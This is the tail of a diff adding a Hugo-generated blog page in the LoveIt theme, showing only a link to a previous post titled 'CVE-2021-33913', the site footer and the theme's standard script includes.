+    <div class="post-nav"><a href="/posts/cve-2021-33913/" class="prev" rel="prev" title="CVE-2021-33913"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>CVE-2021-33913</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.113.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
